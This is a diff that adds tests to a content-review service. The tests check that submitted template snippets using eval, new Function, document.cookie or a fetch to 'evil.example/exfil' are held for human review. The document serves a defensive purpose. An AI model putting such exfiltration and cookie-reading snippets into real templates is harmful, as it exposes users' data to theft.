@@ -263,4 +263,70 @@ describe("ContentService", () => {
     expect(submission).toMatchObject({ status: "pending", check_status: "needs_human" });
     expect(submission?.check_error).toContain("上限");
   });
+
+  it("blocks M1-M4 exfiltration/eval risks for human review while auto-publishing M5 loops and syntax errors as warn", async () => {
+    for (const [id, snippet] of [
+      ["m1", '<% eval("1") %>'],
+      ["m2", '<% new Function("return 1")() %>'],
+      ["m3", "<% const c = document.cookie; %>"],
+      ["m4", '<% await fetch("https://evil.example/exfil") %>'],
+    ] as const) {
+      const content = JSON.stringify({ entries: [{ uid: 1, name: id, content: snippet }] });
+      await seedProject(id, content);
+      await seedSubmission(`sub-${id}`, id);
+      const response = await run(`sub-${id}`);
+      expect(response.status, id).toBe(200);
+      await expect(response.json(), id).resolves.toMatchObject({ routeGate: "block" });
+      const row = await bindings.DB.prepare(
+        "SELECT s.status, ar.status AS check_status, p.published_version_id FROM submissions s JOIN automated_reviews ar ON ar.submission_id = s.id JOIN projects p ON p.id = s.project_id WHERE s.id = ?",
+      )
+        .bind(`sub-${id}`)
+        .first();
+      expect(row, id).toEqual({
+        status: "pending",
+        check_status: "needs_human",
+        published_version_id: null,
+      });
+    }
+
+    for (const [id, snippet] of [
+      ["m5", "<% while (true) { if (done) break; } %>"],
+      ["syntax", "<% if (broken { %>"],
+    ] as const) {
+      const content = JSON.stringify({ entries: [{ uid: 1, name: id, content: snippet }] });
+      await seedProject(id, content);
+      await seedSubmission(`sub-${id}`, id);
+      const response = await run(`sub-${id}`);
+      expect(response.status, id).toBe(200);
+      await expect(response.json(), id).resolves.toMatchObject({ routeGate: "warn", published: true });
+      const row = await bindings.DB.prepare(
+        "SELECT s.status, ar.status AS check_status, p.published_version_id FROM submissions s JOIN automated_reviews ar ON ar.submission_id = s.id JOIN projects p ON p.id = s.project_id WHERE s.id = ?",
+      )
+        .bind(`sub-${id}`)
+        .first();
+      expect(row, id).toEqual({
+        status: "approved",
+        check_status: "done",
+        published_version_id: `r-${id}`,
+      });
+    }
+  });
+
+  it("preserves completed needs_human outcome on duplicate delivery even when check_attempts reached max", async () => {
+    const content = JSON.stringify({ entries: [{ uid: 1, name: "Entry", content: "plain" }] });
+    await seedProject("done3", content);
+    await seedSubmission("sub-done3", "done3", "block", "needs_human", 3);
+    await bindings.DB.prepare(
+      "UPDATE automated_reviews SET error = '原始人工审核原因' WHERE submission_id = 'sub-done3'",
+    ).run();
+    const response = await run("sub-done3");
+    expect(response.status).toBe(200);
+    await expect(response.json()).resolves.toEqual({ skipped: "needs_human" });
+    const row = await bindings.DB.prepare(
+      "SELECT error FROM automated_reviews WHERE submission_id = 'sub-done3'",
+    ).first<{
+      error: string;
+    }>();
+    expect(row?.error).toBe("原始人工审核原因");
+  });
 });
